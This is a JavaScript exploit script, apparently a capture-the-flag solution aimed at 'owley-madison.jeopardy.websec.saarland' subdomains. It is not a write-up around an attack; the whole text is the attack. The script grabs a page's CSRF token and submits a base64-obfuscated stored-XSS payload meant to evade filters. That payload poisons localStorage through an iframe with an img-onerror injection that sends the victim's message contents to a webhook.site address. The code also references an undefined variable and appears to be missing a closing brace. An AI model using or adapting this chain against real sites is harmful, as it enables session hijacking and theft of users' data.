    <script>
        (function() {
            let attempts = 0;
            const maxAttempts = 50; // Try for 5 seconds

            const tokenHunter = setInterval(() => {
                attempts++;
                
                // Look for the token anywhere on the page
                const tokenInput = document.querySelector('input[name="csrfmiddlewaretoken"]');
                
                if (tokenInput && tokenInput.value) {
                    clearInterval(tokenHunter);
                    const token = tokenInput.value;
                    new Image().src = W + "/?step=2_token_grabbed&token_start=" + token.substring(0, 5);
                    executePayload(token);
                } else if (attempts >= maxAttempts) {
                    clearInterval(tokenHunter);
                    new Image().src = W + "/?step=error_timeout_no_token";
                }
            }, 100); // Check every 100ms

            function executePayload(token) {
                // The Diary Payload (Base64 encoded to bypass filters)
                const diaryJS = `
                    document.domain = "owley-madison.jeopardy.websec.saarland";
                    var f = document.createElement("iframe");
                    f.src = "https://match.owley-madison.jeopardy.websec.saarland/";
                    f.onload = function() {
                        try {
                            var payload = '</option><img src=x onerror="new Image().src=\\'https://webhook.site/6ef9bff5-8aaa-4fc4-8a76-743310ff8782/?flag=\\'+encodeURIComponent(document.getElementById(\\'message\\').value)">';
                            f.contentWindow.localStorage.setItem("favorites", JSON.stringify([payload]));
                            window.location.href = "https://chat.owley-madison.jeopardy.websec.saarland/";
                        } catch(e) {
                            new Image().src = "https://webhook.site/6ef9bff5-8aaa-4fc4-8a76-743310ff8782/?error=" + btoa(e.message);
                        }
                    };
                    document.body.appendChild(f);
                `;

                const finalPayload = "<script>eval(atob('" + btoa(diaryJS) + "'));<\/script>";

                const form = document.createElement('form');
                form.action = 'https://diary.owley-madison.jeopardy.websec.saarland/entry';
                form.method = 'POST';
                
                form.innerHTML = '<input name="content" id="c"><input name="csrfmiddlewaretoken" id="t">';
                document.body.appendChild(form);
                
                document.getElementById('c').value = finalPayload;
                document.getElementById('t').value = token;
                
                new Image().src = W + "/?step=3_submitting_to_diary";
                form.submit();

        })();
